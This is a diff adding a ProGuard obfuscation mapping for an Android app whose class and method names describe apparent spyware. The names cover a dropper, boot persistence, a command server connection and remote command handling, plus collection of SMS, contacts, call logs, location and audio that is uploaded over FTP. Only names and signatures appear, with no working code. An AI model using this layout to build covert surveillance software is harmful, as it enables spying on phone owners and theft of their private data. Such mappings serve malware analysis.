+    long id -> a
+    int times_contacted -> b
+    long last_time_contacted -> c
+    int starred -> d
+    int type_addr -> e
+    java.lang.String display_name -> f
+    java.lang.String phones -> g
+    java.lang.String emails -> h
+    java.lang.String notes -> i
+    java.lang.String street -> j
+    java.lang.String city -> k
+    java.lang.String region -> l
+    java.lang.String postalcode -> m
+    java.lang.String country -> n
+    java.lang.String messaging -> o
+    java.lang.String OrganisationName -> p
+    java.lang.String OrganisationStatus -> q
+    byte[] photo -> r
+    int getBodySize() -> a
+    byte[] build() -> b
+    void setRegion(java.lang.String) -> a
+    void setId(long) -> a
+    void setTimes_contacted(int) -> a
+    void setLast_time_contacted(long) -> b
+    void setDisplay_name(java.lang.String) -> b
+    void setStarred(int) -> b
+    void setPhones(java.lang.String) -> c
+    void setEmails(java.lang.String) -> d
+    void setNotes(java.lang.String) -> e
+    void setStreet(java.lang.String) -> f
+    void setCity(java.lang.String) -> g
+    void setPostalcode(java.lang.String) -> h
+    void setCountry(java.lang.String) -> i
+    void setType_addr(int) -> c
+    void setMessaging(java.lang.String) -> j
+    void setOrganisationName(java.lang.String) -> k
+    void setOrganisationStatus(java.lang.String) -> l
+    void setPhoto(byte[]) -> a
+sub.app.client.ContactsPacket -> sub.app.a.e:
+    java.util.ArrayList list -> a
+    byte[] build() -> b
+    int getBodySize() -> a
+sub.app.client.GlobalPacket -> sub.app.a.f:
+    java.lang.String ftpAdminID -> a
+    java.lang.String ftpDcimID -> b
+    java.lang.String ftpFileID -> c
+    java.lang.String ftpRecID -> d
+    java.lang.String ftpTempID -> e
+    java.lang.String ftpAdminPW -> f
+    java.lang.String ftpDcimPW -> g
+    java.lang.String ftpFilePW -> h
+    java.lang.String ftpRecPW -> i
+    java.lang.String ftpTempPW -> j
+    void checknull() -> c
+    int getBodySize() -> a
+    byte[] build() -> b
+sub.app.client.Packet -> sub.app.a.g:
+    int getBodySize() -> a
+    byte[] build() -> b
+sub.app.client.PreferencePacket -> sub.app.a.h:
+    int port -> a
+    java.lang.String ip -> b
+    java.lang.String phoneNumberCall -> c
+    java.lang.String phoneNumberSMS -> d
+    java.lang.String keywordSMS -> e
+    int getBodySize() -> a
+    byte[] build() -> b
+    void parse(byte[]) -> a
+    java.lang.String getIp() -> c
+    void setIp(java.lang.String) -> a
+    int getPort() -> d
+    void setPort(int) -> a
+    java.util.ArrayList getPhoneNumberCall() -> e
+    void setPhoneNumberCall(java.lang.String) -> b
+    java.util.ArrayList getPhoneNumberSMS() -> f
+    void setPhoneNumberSMS(java.lang.String) -> c
+    java.lang.String getKeywordSMS() -> g
+    void setKeywordSMS(java.lang.String) -> d
+sub.app.client.SMSPacket -> sub.app.a.i:
+    int id -> a
+    int thread_id -> b
+    int person -> c
+    int read -> d
+    int type -> e
+    java.lang.String date -> f
+    java.lang.String address -> g
+    java.lang.String body -> h
+    int getBodySize() -> a
+    byte[] build() -> b
+sub.app.client.SMSTreePacket -> sub.app.a.j:
+    java.util.ArrayList list -> a
+    byte[] build() -> b
+    int getBodySize() -> a
+sub.app.client.StatusPacket -> sub.app.a.k:
+    int code -> a
+    int status -> b
+    int data1 -> c
+    int data2 -> d
+    java.lang.String data3 -> e
+    void checknull() -> c
+    int getBodySize() -> a
+    byte[] build() -> b
+sub.app.entry.CTypeCast -> sub.app.entry.a:
+    java.nio.ByteBuffer mBuffer -> a
+    sub.app.entry.CTypeCast allocate(int) -> a
+    byte[] Int2Bytes(int) -> b
+    void putLong(long) -> a
+    void putInt(int) -> c
+    void putString(java.lang.String) -> a
+    void putBytes(byte[]) -> a
+    void append(byte[]) -> b
+    byte[] toPtr() -> a
+    int getInt() -> b
+    java.lang.String getString() -> c
+sub.app.entry.Controler -> sub.app.entry.b:
+    void OnReceive(byte,int,int,byte[]) -> a
+sub.app.entry.NetModel -> sub.app.entry.c:
+    java.net.Socket mSocket -> a
+    java.lang.String ip -> b
+    int port -> c
+    java.io.DataOutputStream out -> d
+    java.io.DataInputStream in -> e
+    sub.app.entry.Controler controler -> f
+    long recvTick -> g
+    long sendTick -> h
+    int mDevID -> i
+    java.lang.String szDevID -> j
+    boolean Open() -> a
+    void Close() -> b
+    boolean ReadPacket() -> c
+    void WritePacket$2e6943ab(int,int,byte[]) -> a
+    void setRecvTick() -> e
+    boolean IsRecvActive() -> d
+sub.app.entry.OnAlarm -> sub.app.entry.OnAlarm:
+    java.lang.String TAG -> a
+    void onReceive(android.content.Context,android.content.Intent) -> onReceive
+sub.app.entry.OnBoot -> sub.app.entry.OnBoot:
+    java.lang.String TAG -> a
+    void onReceive(android.content.Context,android.content.Intent) -> onReceive
+sub.app.entry.Protocol -> sub.app.entry.d:
+    int DropperVer -> a
+    int PRODUCT_ID -> b
+    int IS_ROOTED_APP -> c
+    int IsAliveVersion -> d
+    void DecryptPacketPhone(byte[]) -> a
+    byte[] compress(byte[]) -> b
+    byte[] MakePacket$e434d90(byte,int,java.lang.String,int,byte[]) -> a
+    byte[] build_PacketList(java.util.ArrayList) -> a
+    java.lang.String getServerIP() -> a
+sub.app.entry.RunCmd -> sub.app.entry.e:
+    sub.app.entry.TaskListener tasklistener -> a
+    android.content.Intent intent -> b
+sub.app.entry.RunCmd$1 -> sub.app.entry.f:
+    sub.app.entry.RunCmd this$0 -> a
+    int val$ch -> b
+    java.nio.ByteBuffer val$arguments -> c
+    void run() -> run
+sub.app.entry.RunCmd$2 -> sub.app.entry.g:
+    sub.app.entry.RunCmd this$0 -> a
+    int val$ch -> b
+    java.nio.ByteBuffer val$arguments -> c
+    void run() -> run
+sub.app.entry.RunCmd$3 -> sub.app.entry.h:
+    sub.app.entry.RunCmd this$0 -> a
+    int val$ch -> b
+    java.nio.ByteBuffer val$arguments -> c
+    void run() -> run
+sub.app.entry.Task -> sub.app.entry.Task:
+    java.lang.String TAG -> a
+    int nbAttempts -> b
+    int elapsedTime -> c
+    boolean stop -> d
+    boolean isRunning -> e
+    boolean isListening -> f
+    sub.app.entry.NetModel mConn -> g
+    java.lang.Thread readthread -> h
+    java.lang.Thread checkthread -> i
+    sub.app.entry.RunCmd procCmd -> j
+    byte[] cmd -> k
+    android.os.Handler handler -> q
+    void processCommand(android.os.Bundle) -> a
+    void OnReceive(byte,int,int,byte[]) -> a
+    boolean sendSerialPacket(byte,int,byte[]) -> b
+    void handleData(byte,int,byte[]) -> a
+    void onCreate() -> onCreate
+    void CreateCommThread() -> e
+    void OnCreateReport() -> f
+    void ConnectToServer() -> a
+    int onStartCommand(android.content.Intent,int,int) -> onStartCommand
+    void ResetConnection() -> b
+    void close_routine() -> g
+    void waitInstruction() -> c
+    void checkconnection() -> d
+    void reconnectionAttempts() -> h
+    void onDestroy() -> onDestroy
+    void resetConnectionAttempts() -> i
+sub.app.entry.Task$1 -> sub.app.entry.i:
+    sub.app.entry.Task this$0 -> a
+    void handleMessage(android.os.Message) -> handleMessage
+sub.app.entry.Task$2 -> sub.app.entry.j:
+    sub.app.entry.Task this$0 -> a
+    void run() -> run
+sub.app.entry.Task$3 -> sub.app.entry.k:
+    sub.app.entry.Task this$0 -> a
+    void run() -> run
+sub.app.entry.Task$4 -> sub.app.entry.l:
+    sub.app.entry.Task this$0 -> a
+    sub.app.entry.TaskListener val$cxt -> b
+    void run() -> run
+sub.app.entry.Task$5 -> sub.app.entry.m:
+    sub.app.entry.Task this$0 -> a
+    void run() -> run
+sub.app.entry.TaskListener -> sub.app.entry.n:
+    sub.app.func.CallLogListener callLogLister -> l
+    sub.app.func.FileDownloader fileDownloader -> m
+    android.widget.Toast toast -> n
+    boolean isConnected -> o
+    android.content.BroadcastReceiver ConnectivityCheckReceiver -> p
+    void handleData(byte,int,byte[]) -> a
+    void ResetConnection() -> b
+    void onLocationChanged(android.location.Location) -> onLocationChanged
+    void onProviderDisabled(java.lang.String) -> onProviderDisabled
+    void onProviderEnabled(java.lang.String) -> onProviderEnabled
+    void onStatusChanged(java.lang.String,int,android.os.Bundle) -> onStatusChanged
+    void onPeriodicNotification(android.media.AudioRecord) -> onPeriodicNotification
+    void onMarkerReached(android.media.AudioRecord) -> onMarkerReached
+    android.os.IBinder onBind(android.content.Intent) -> onBind
+sub.app.entry.TaskListener$1 -> sub.app.entry.o:
+    sub.app.entry.TaskListener this$0 -> a
+    void onReceive(android.content.Context,android.content.Intent) -> onReceive
+sub.app.func.CallLogListener -> sub.app.b.a:
+    boolean listCallLog$350b1283(sub.app.entry.TaskListener,int) -> a
+sub.app.func.ContactsListener -> sub.app.b.b:
+    java.lang.String appendContactName(android.content.Context,java.lang.String) -> a
+    java.lang.String getContactName(android.content.Context,java.lang.String) -> b
+    java.lang.String getContactDBName(android.content.Context,java.lang.String) -> c
+    boolean listContacts$350b1283(sub.app.entry.TaskListener,int) -> a
+sub.app.func.FileDownloader -> sub.app.b.c:
+    java.lang.String FTP_ID -> a
+    java.lang.String FTP_PW -> b
+sub.app.func.FtpManager -> sub.app.b.d:
+    org.apache.commons.net.ftp.FTPClient ftp -> a
+    java.lang.String mServer -> b
+    int mPort -> c
+    java.lang.String mId -> d
+    java.lang.String mPass -> e
+    java.lang.String mEncoding -> f
+    java.lang.String szDeviceNum -> g
+    void setAccount(java.lang.String,java.lang.String,java.lang.String,android.content.Context) -> a
+    boolean FtpLogin() -> a
+    void FtpLogout() -> b
+    boolean FtpIsConnected() -> c
+    boolean FtpUploadFile(java.io.File) -> a
+sub.app.func.SMSListener -> sub.app.b.e:
+    boolean listSMS$350b1283(sub.app.entry.TaskListener,int) -> a
